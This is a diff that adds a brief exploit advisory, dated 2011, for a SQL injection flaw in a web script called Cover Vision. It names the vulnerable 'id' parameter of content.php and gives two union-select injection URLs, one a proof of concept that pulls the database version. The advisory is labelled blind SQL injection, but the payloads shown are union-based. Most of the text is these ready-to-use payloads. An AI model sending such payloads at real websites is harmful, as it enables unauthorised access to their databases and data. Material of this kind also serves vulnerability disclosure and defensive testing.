@@ -1,0 +1,25 @@
+*####################################################################
+[+] Exploit Title : Cover Vision  [ Sql Injection Vulnerability]
+[+] Author : Kr4L BeNiM
+[+] Contact : KralBenimRocks [@] Gmail [.] Com
+[+] Date : November 9, 2011
+[+] Software Link:
+http://unikscripts.com/yaxal_products.php?display=product&id=66
+[+] Category: Web Apps [Blind SQL Injection]
+####################################################################
+
+Vulnerability:
+
+*SQL injection Vulnerability*
+
+[#]
+http://patch/content.php?id=1+union+select+1,2,3,4,[sqli],6,7,8,9,10,11,12,13
+
+[#] P0C:
+
+http://server/content.php?id=-1+union+select+1,2,3,4,version(),6,7,8,9,10,11,12,13
+
+####################################################################
+[+] Greets : Likuid Sky, Hax.Root, SOG, TSL, CyberLeets.
+####################################################################
+*
